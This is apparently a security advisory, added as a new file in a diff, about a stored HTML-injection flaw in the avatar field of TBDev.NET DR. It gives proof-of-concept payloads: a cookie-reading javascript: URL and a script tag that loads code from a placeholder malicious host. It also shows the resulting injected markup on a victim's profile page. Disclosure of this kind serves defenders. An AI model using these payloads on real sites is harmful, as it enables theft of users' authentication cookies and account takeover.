@@ -1,0 +1,32 @@
+source: http://www.securityfocus.com/bid/24923/info
+
+TBDev.NET DR is prone to an HTML-injection vulnerability because it fails to sufficiently sanitize user-supplied input data.
+
+Exploiting this issue may allow an attacker to execute HTML and script code in the context of the affected site, to steal cookie-based authentication credentials, or to control how the site is rendered to the user; other attacks are also possible.
+
+TBDev.NET DR 010306 and prior versions are vulnerable. 
+
+version 11-10-05-BETA-SF1:111005 <=
+
+ $avatar = $_POST["avatar"];
+
+ where
+
+ $_POST["avatar"]=javascript:alert(document.cookie);
+  or
+ $_POST["avatar"]="><script 
+src=http://urlmaliciousJavaScript></script><";
+
+-> last version  <= 010306
+$_POST["avatar"]=javascript:alert(document.cookie);
+
+go to
+http://torrentvictim/userdetails.php?id=malicioususerprofileid
+the souce code is:
+...<tr><td class=rowhead>Avatar</td><td align=left><img src="\"><script
+src=http://urlmaliciousJavaScript><script><\""></td></tr>...
+
+or
+
+...<tr><td class=rowhead>Avatar</td><td align=left><img
+src="javascript:alert(document.cookie);"></td></tr>...
